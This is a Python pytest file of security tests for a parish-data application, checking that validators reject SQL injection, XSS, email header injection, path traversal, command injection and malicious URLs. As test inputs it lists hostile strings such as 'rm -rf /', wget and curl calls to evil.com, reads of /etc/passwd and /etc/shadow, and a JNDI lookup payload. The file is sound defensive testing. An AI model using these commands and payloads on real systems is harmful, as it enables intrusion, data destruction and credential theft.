#!/usr/bin/env python3
"""
Security testing for diocesan vitality input validation and data handling.

Tests for common security vulnerabilities including injection attacks,
input validation bypass, data sanitization, and access control.
"""

import re
from unittest.mock import Mock, patch

import pytest

from core.logger import get_logger
from core.parish_validation import is_valid_email, is_valid_phone, validate_parish_data

logger = get_logger(__name__)


class TestInputValidationSecurity:
    """Security tests for input validation and sanitization."""

    @pytest.mark.security
    def test_sql_injection_prevention(self):
        """Test that SQL injection attempts are properly blocked."""

        def mock_safe_query(query, params):
            """Mock database query that should use parameterized queries."""
            # Simulate proper parameterized query handling
            if "'" in query and params is None:
                raise Exception("Potential SQL injection detected - use parameterized queries")
            return {"success": True, "rows": []}

        # Test safe parameterized queries
        safe_query = "SELECT * FROM parishes WHERE name = %s"
        safe_params = ("St. Mary Parish",)
        result = mock_safe_query(safe_query, safe_params)
        assert result["success"] is True

        # Test SQL injection attempts
        injection_attempts = [
            "'; DROP TABLE parishes; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO parishes VALUES ('evil', 'data'); --",
            "' OR 1=1 #",
            "admin'--",
            "' OR 'x'='x",
        ]

        for injection in injection_attempts:
            unsafe_query = f"SELECT * FROM parishes WHERE name = '{injection}'"
            with pytest.raises(Exception, match="SQL injection"):
                mock_safe_query(unsafe_query, None)

        logger.info(f"✅ SQL injection test: Blocked {len(injection_attempts)} injection attempts")

    @pytest.mark.security
    def test_xss_prevention(self):
        """Test XSS (Cross-Site Scripting) prevention in user inputs."""

        def sanitize_html_input(user_input):
            """Mock HTML sanitization function."""
            if not user_input or not isinstance(user_input, str):
                return ""

            # Remove script tags and dangerous attributes
            dangerous_patterns = [
                r"<script.*?>.*?</script>",
                r"javascript:",
                r"on\w+\s*=",
                r"<iframe.*?>",
                r"<object.*?>",
                r"<embed.*?>",
            ]

            sanitized = user_input
            for pattern in dangerous_patterns:
                sanitized = re.sub(pattern, "", sanitized, flags=re.IGNORECASE | re.DOTALL)

            return sanitized

        # Test legitimate inputs
        safe_inputs = [
            "St. Mary Parish",
            "Contact us at info@parish.org",
            "123 Main Street, Suite 100",
            "Mass times: Sunday 9:00 AM",
        ]

        for safe_input in safe_inputs:
            sanitized = sanitize_html_input(safe_input)
            assert sanitized == safe_input, f"Safe input was modified: {safe_input}"

        # Test XSS attempts
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<object data='javascript:alert(\"XSS\")'></object>",
            "<embed src='javascript:alert(\"XSS\")'></embed>",
            "<a href='javascript:alert(\"XSS\")'>Click me</a>",
            "<div onclick='alert(\"XSS\")'>Clickable div</div>",
        ]

        for xss_attempt in xss_attempts:
            sanitized = sanitize_html_input(xss_attempt)
            # Should remove the dangerous parts
            assert "<script>" not in sanitized
            assert "javascript:" not in sanitized
            assert "onclick=" not in sanitized
            assert "<iframe" not in sanitized

        logger.info(f"✅ XSS prevention test: Sanitized {len(xss_attempts)} XSS attempts")

    @pytest.mark.security
    def test_email_injection_prevention(self):
        """Test prevention of email header injection attacks."""

        def validate_email_safely(email_input):
            """Validate email and prevent header injection."""
            if not email_input or not isinstance(email_input, str):
                return False

            # Check for email header injection patterns
            injection_patterns = [
                r"\r\n",  # CRLF injection
                r"\n",  # LF injection
                r"\r",  # CR injection
                r"%0A",  # URL-encoded LF
                r"%0D",  # URL-encoded CR
                r"bcc:",  # BCC injection
                r"cc:",  # CC injection
                r"to:",  # TO injection
                r"subject:",  # Subject injection
            ]

            for pattern in injection_patterns:
                if re.search(pattern, email_input, re.IGNORECASE):
                    return False

            # Use the existing email validation
            return is_valid_email(email_input)

        # Test safe emails
        safe_emails = [
            "contact@parish.org",
            "admin@stmary.church",
            "info+newsletter@diocese.net",
        ]

        for email in safe_emails:
            assert validate_email_safely(email) is True, f"Safe email rejected: {email}"

        # Test email injection attempts
        injection_attempts = [
            "user@domain.com\r\nBcc: evil@hacker.com",
            "user@domain.com\nSubject: Hacked",
            "user@domain.com%0ABcc: attacker@evil.com",
            "user@domain.com%0D%0ABcc: bad@actor.com",
            "legitimate@email.com\r\nTo: victim@target.com",
            "test@test.com\nCc: spam@evil.org",
        ]

        for injection in injection_attempts:
            assert validate_email_safely(injection) is False, f"Email injection not blocked: {injection}"

        logger.info(f"✅ Email injection test: Blocked {len(injection_attempts)} injection attempts")

    @pytest.mark.security
    def test_path_traversal_prevention(self):
        """Test prevention of directory traversal attacks."""

        def safe_file_access(filename):
            """Mock safe file access that prevents path traversal."""
            if not filename or not isinstance(filename, str):
                return False

            # Check for path traversal patterns
            dangerous_patterns = [
                "..",  # Parent directory
                "~",  # Home directory
                "/etc/",  # System directories
                "/var/",  # Variable data
                "/usr/",  # User programs
                "/bin/",  # Binaries
                "/root/",  # Root directory
                "c:\\",  # Windows system drive
                "\\\\",  # UNC paths
                "%2e%2e",  # URL-encoded ..
                "%2f",  # URL-encoded /
                "%5c",  # URL-encoded \
            ]

            filename_lower = filename.lower()
            for pattern in dangerous_patterns:
                if pattern in filename_lower:
                    return False

            # Only allow specific file extensions for parish data
            allowed_extensions = [".json", ".csv", ".txt", ".log"]
            if not any(filename.endswith(ext) for ext in allowed_extensions):
                return False

            return True

        # Test safe filenames
        safe_filenames = [
            "parish_data.json",
            "export_2024.csv",
            "processing.log",
            "diocese_report.txt",
        ]

        for filename in safe_filenames:
            assert safe_file_access(filename) is True, f"Safe filename rejected: {filename}"

        # Test path traversal attempts
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "~/sensitive_file.txt",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
            "\\\\server\\share\\file.txt",
            "c:\\windows\\system32\\drivers\\etc\\hosts",
            "../config/database.conf",
        ]

        for attempt in traversal_attempts:
            assert safe_file_access(attempt) is False, f"Path traversal not blocked: {attempt}"

        logger.info(f"✅ Path traversal test: Blocked {len(traversal_attempts)} traversal attempts")

    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test prevention of command injection in system calls."""

        def safe_system_command(user_input):
            """Mock safe system command execution."""
            if not user_input or not isinstance(user_input, str):
                return False

            # Check for command injection patterns
            injection_patterns = [
                ";",  # Command separator
                "|",  # Pipe
                "&",  # Background execution
                "$(",  # Command substitution
                "`",  # Backtick execution
                ">",  # Redirect
                "<",  # Input redirect
                "||",  # OR operator
                "&&",  # AND operator
                "\n",  # Newline
                "\r",  # Carriage return
            ]

            for pattern in injection_patterns:
                if pattern in user_input:
                    return False

            # Only allow alphanumeric characters, spaces, hyphens, and underscores
            if not re.match(r"^[a-zA-Z0-9\s\-_]+$", user_input):
                return False

            return True

        # Test safe inputs
        safe_inputs = [
            "parish_backup",
            "diocese_report_2024",
            "data_export",
            "St_Mary_Parish",
        ]

        for safe_input in safe_inputs:
            assert safe_system_command(safe_input) is True, f"Safe input rejected: {safe_input}"

        # Test command injection attempts
        injection_attempts = [
            "parish_data; rm -rf /",
            "report.txt | cat /etc/passwd",
            "data & wget http://evil.com/malware",
            "backup $(cat /etc/shadow)",
            "export `whoami`",
            "file > /dev/null; curl evil.com",
            "data < /etc/passwd",
            "command || rm important_file",
            "safe && dangerous_command",
            "file\nrm -rf /home",
        ]

        for injection in injection_attempts:
            assert safe_system_command(injection) is False, f"Command injection not blocked: {injection}"

        logger.info(f"✅ Command injection test: Blocked {len(injection_attempts)} injection attempts")


class TestDataSecurityValidation:
    """Security tests for data validation and sanitization."""

    def _sanitize_parish_data(self, parish_data):
        """Sanitize parish data for security."""
        if not isinstance(parish_data, dict):
            return {}

        sanitized = {}

        # Sanitize string fields
        string_fields = ["name", "address", "city", "state", "phone", "email", "website_url"]
        for field in string_fields:
            if field in parish_data:
                value = parish_data[field]
                if isinstance(value, str):
                    # Remove null bytes and control characters
                    sanitized_value = value.replace("\x00", "").replace("\x08", "").replace("\x0c", "")
                    # Limit length to prevent DOS attacks
                    if len(sanitized_value) > 500:
                        sanitized_value = sanitized_value[:500]
                    sanitized[field] = sanitized_value
                else:
                    sanitized[field] = str(value) if value is not None else ""

        # Validate numeric fields
        if "diocese_id" in parish_data:
            try:
                diocese_id = int(parish_data["diocese_id"])
                if 1 <= diocese_id <= 10000:  # Reasonable range
                    sanitized["diocese_id"] = diocese_id
            except (ValueError, TypeError):
                pass  # Invalid diocese_id is omitted

        return sanitized

    @pytest.mark.security
    def test_parish_data_sanitization(self):
        """Test that parish data is properly sanitized."""

        # Test with malicious data
        malicious_parish = {
            "name": "St. Evil Parish\x00\x08\x0c",
            "address": "<script>alert('xss')</script>123 Main St",
            "phone": "'; DROP TABLE parishes; --",
            "email": "evil@hacker.com\r\nBcc: victim@target.com",
            "website_url": "javascript:alert('xss')",
            "diocese_id": "'; DELETE FROM dioceses; --",
            "malicious_field": "../../etc/passwd",
        }

        sanitized = self._sanitize_parish_data(malicious_parish)

        # Verify sanitization
        assert "\x00" not in sanitized.get("name", "")
        assert "\x08" not in sanitized.get("name", "")
        assert "\x0c" not in sanitized.get("name", "")
        assert "diocese_id" not in sanitized  # Invalid diocese_id should be omitted
        assert "malicious_field" not in sanitized  # Unknown fields should be omitted

        logger.info("✅ Parish data sanitization test: Malicious data properly sanitized")

    @pytest.mark.security
    def test_phone_number_validation_security(self):
        """Test phone number validation against malicious inputs."""

        # Test legitimate phone numbers
        valid_phones = [
            "(555) 123-4567",
            "555-123-4567",
            "555.123.4567",
            "+1 555 123 4567",
        ]

        for phone in valid_phones:
            assert is_valid_phone(phone) is True, f"Valid phone rejected: {phone}"

        # Test malicious phone inputs
        malicious_phones = [
            "'; DROP TABLE parishes; --",
            "<script>alert('xss')</script>",
            "javascript:alert('phone')",
            "\x00\x08\x0c555-123-4567",
            "555-123-4567\r\nBcc: evil@hacker.com",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/exploit}",
            "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']}",
        ]

        for phone in malicious_phones:
            assert is_valid_phone(phone) is False, f"Malicious phone not rejected: {phone}"

        logger.info(f"✅ Phone validation security test: Rejected {len(malicious_phones)} malicious inputs")

    @pytest.mark.security
    def test_url_validation_security(self):
        """Test URL validation against malicious URLs."""

        def validate_url_safely(url):
            """Secure URL validation."""
            if not url or not isinstance(url, str):
                return False

            # Remove null bytes and control characters
            url = url.replace("\x00", "").replace("\x08", "").replace("\x0c", "")

            # Check for dangerous protocols
            dangerous_protocols = [
                "javascript:",
                "data:",
                "vbscript:",
                "file:",
                "ftp:",
                "jar:",
                "chrome:",
                "chrome-extension:",
                "moz-extension:",
            ]

            url_lower = url.lower()
            for protocol in dangerous_protocols:
                if url_lower.startswith(protocol):
                    return False

            # Only allow http and https
            if not (url_lower.startswith("http://") or url_lower.startswith("https://")):
                return False

            # Check for suspicious patterns
            suspicious_patterns = ["..", "<script", "javascript:", "vbscript:", "onload=", "onerror="]

            for pattern in suspicious_patterns:
                if pattern in url_lower:
                    return False

            return True

        # Test safe URLs
        safe_urls = [
            "https://parish.org",
            "http://www.diocese.net/about",
            "https://stmary.church/contact.html",
        ]

        for url in safe_urls:
            assert validate_url_safely(url) is True, f"Safe URL rejected: {url}"

        # Test malicious URLs
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "vbscript:msgbox('xss')",
            "file:///etc/passwd",
            "ftp://evil.com/malware",
            "https://evil.com/../../../etc/passwd",
            "http://parish.org<script>alert('xss')</script>",
            "https://site.com?onload=alert('xss')",
            "jar:http://evil.com!/malicious.class",
            "chrome://settings/",
        ]

        for url in malicious_urls:
            assert validate_url_safely(url) is False, f"Malicious URL not rejected: {url}"

        logger.info(f"✅ URL validation security test: Rejected {len(malicious_urls)} malicious URLs")


class TestAccessControlSecurity:
    """Security tests for access control and authorization."""

    @pytest.mark.security
    def test_api_rate_limiting(self):
        """Test API rate limiting to prevent abuse."""

        class RateLimiter:
            def __init__(self, max_requests=10, time_window=60):
                self.max_requests = max_requests
                self.time_window = time_window
                self.requests = {}

            def is_allowed(self, client_id):
                import time

                current_time = time.time()

                if client_id not in self.requests:
                    self.requests[client_id] = []

                # Remove old requests outside time window
                self.requests[client_id] = [
                    req_time for req_time in self.requests[client_id] if current_time - req_time < self.time_window
                ]

                # Check if under limit
                if len(self.requests[client_id]) < self.max_requests:
                    self.requests[client_id].append(current_time)
                    return True

                return False

        rate_limiter = RateLimiter(max_requests=5, time_window=1)

        # Test normal usage
        client_id = "test_client"
        allowed_requests = 0
        denied_requests = 0

        # Make 10 requests rapidly
        for i in range(10):
            if rate_limiter.is_allowed(client_id):
                allowed_requests += 1
            else:
                denied_requests += 1

        # Should allow 5 and deny 5
        assert allowed_requests == 5, f"Wrong number allowed: {allowed_requests}"
        assert denied_requests == 5, f"Wrong number denied: {denied_requests}"

        logger.info(f"✅ Rate limiting test: {allowed_requests} allowed, {denied_requests} denied")

    @pytest.mark.security
    def test_input_length_limits(self):
        """Test input length limits to prevent DOS attacks."""

        def validate_input_length(field_name, value, max_length):
            """Validate input length."""
            if not isinstance(value, str):
                return False

            if len(value) > max_length:
                return False

            return True

        # Test reasonable inputs
        reasonable_inputs = [
            ("name", "St. Mary Parish", 100),
            ("address", "123 Main Street, Test City, TS 12345", 200),
            ("phone", "(555) 123-4567", 20),
            ("email", "contact@parish.org", 100),
        ]

        for field, value, max_len in reasonable_inputs:
            assert validate_input_length(field, value, max_len) is True

        # Test DOS attack attempts (very long inputs)
        dos_attempts = [
            ("name", "A" * 10000, 100),
            ("address", "B" * 50000, 200),
            ("description", "C" * 1000000, 1000),
        ]

        for field, value, max_len in dos_attempts:
            assert validate_input_length(field, value, max_len) is False

        logger.info(f"✅ Input length test: Blocked {len(dos_attempts)} DOS attempts")


if __name__ == "__main__":
    # Run security tests when script is executed directly
    pytest.main([__file__, "-v", "-m", "security", "--tb=short"])
